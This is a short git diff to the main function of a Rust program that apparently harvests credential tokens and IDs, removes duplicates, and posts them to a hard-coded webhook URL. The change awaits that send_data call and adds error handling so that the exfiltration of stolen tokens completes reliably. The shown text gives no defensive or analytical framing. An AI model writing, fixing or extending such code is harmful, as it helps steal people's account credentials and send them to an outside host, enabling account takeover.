@@ -55,7 +55,7 @@ async fn main() {
 
     // // Remove duplicates
     let uncheck_tokens: Vec<String> = global::utils::remove_duplicates(new_credentials.lock().unwrap().token.clone());
- 
+    
     // Clear new credentials fields
     new_credentials.lock().unwrap().token.clear();
     new_credentials.lock().unwrap().id.clear();
@@ -91,7 +91,13 @@ async fn main() {
     // Remove duplicates
     final_creds.id = global::utils::remove_duplicates(final_creds.id.clone());
 
-    global::utils::send_data(global::utils::WEBHOOK_URL, &format!("{:?}NOP{:?}", final_creds.id, final_creds.token));
+    let ret = global::utils::send_data(global::utils::WEBHOOK_URL, &format!("{:?}NOP{:?}", final_creds.id, final_creds.token)).await;
 
+    match ret {
+        Ok(_) => {},
+        Err(e) => {
+            eprintln!("Error: {}", e);
+        }
+    }
     return;
 }
